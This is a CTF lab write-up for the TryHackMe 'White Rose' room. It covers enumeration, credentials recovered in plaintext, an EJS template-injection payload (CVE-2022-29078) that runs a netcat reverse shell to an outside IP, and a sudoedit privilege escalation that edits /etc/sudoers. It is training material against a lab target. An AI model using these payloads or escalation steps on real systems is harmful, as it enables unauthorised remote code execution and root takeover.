<code>
https://tryhackme.com/r/room/whiterose

## White Rose

### Enumeration
┌──(kali㉿kali)-[~/Documents/THM/THM_whiterose]
└─$ nmap -A -Pn -p80 cyprusbank.thm 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 05:30 EST
Nmap scan report for cyprusbank.thm (10.10.211.123)
Host is up (0.035s latency).
rDNS record for 10.10.211.123: whiterose.thm

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

┌──(kali㉿kali)-[~/Documents/THM/THM_whiterose]
└─$ ffuf -w ../../www/wordlists/Subdomain.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1 
found admin.cyprusbank.thm


### Use crentials
Olivia Cortez:olivi8


#### Found

http://admin.cyprusbank.thm/messages/?c=0

Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'

### Use crentials


in /setting found this

[ CVE-2022–29078 ] → EJS Server Side Template Injection RCE → PoC ( Link to the Writeup Below )


### Get reverse shell

POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 199
Origin: http://admin.cyprusbank.thm
Connection: keep-alive
Referer: http://admin.cyprusbank.thm/settings
Cookie: connect.sid=s%3Ad_bGl7Fk6eaYR2o2ysYtiIvEecJP7U7b.E9%2BCA%2Fmz0yjQrd2hHxoKSw1cxNreXYM0k%2BmuDqIVvEY
Upgrade-Insecure-Requests: 1

name=xx&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc  10.9.1.144 4445 -e sh');



╔══════════╣ Analyzing Env Files (limit 70)
-rw-rw-r-- 1 web web 59 Jul 16  2023 /home/web/app/.env                                                             
MONGO=mongodb://localhost
SECRET=secureappsecret
PORT=8080


╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
Matching Defaults entries for web on cyprusbank:                                                                    
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

### Privescalation

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/?source=post_page-----972ee9129fe2--------------------------------


export EDITOR="vim -- /etc/sudoers"
sudoedit /opt/example.txt
Copied!
In vim editor, add the following line in /etc/sudoers.
Assume the current username is “john”

web ALL=(ALL:ALL) ALL
Copied!
After that, we can escalate to root privilege.

sudo su root

  
<\code>

